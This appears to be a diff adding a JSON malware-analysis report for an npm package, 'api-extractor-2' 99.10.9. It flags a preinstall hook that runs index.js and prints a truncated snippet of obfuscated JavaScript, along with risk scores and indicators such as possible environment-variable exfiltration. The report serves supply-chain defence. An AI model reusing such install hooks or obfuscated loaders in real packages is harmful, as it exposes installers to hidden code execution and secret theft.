@@ -1,0 +1,34 @@
+{
+  "package_metadata": {
+    "name": "api-extractor-2",
+    "version": "99.10.9"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [],
+    "process_actions": [
+      {
+        "action": "preinstall script execution",
+        "details": "The package.json has a script automatically running when the package is installed: 'node index.js'. Location: package/package.json:8."
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/index.js",
+        "code_snippet": "var _0x55c358=_0xa5ec;(function(_0x31b897,_0x691425){var _0x56f000=_0xa5ec,_0x1493ab=_0x31b897();while(!![]){try{var _0xf7ef5d=-parseInt(_0x56f000(0x1dd))/0x1+-parseInt(_0x56f000(0x1f2))/0x2*(-parseInt(_0x56f000(0x1cf))/0x3)+parseInt(_0x56f...1f5)]();}\\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.75,
+    "confidence": 0.9,
+    "indicators": [
+      "Preinstall script executing arbitrary code",
+      "Obfuscated JavaScript detected",
+      "Potential for environment variable exfiltration or other harmful behavior"
+    ]
+  }
+}
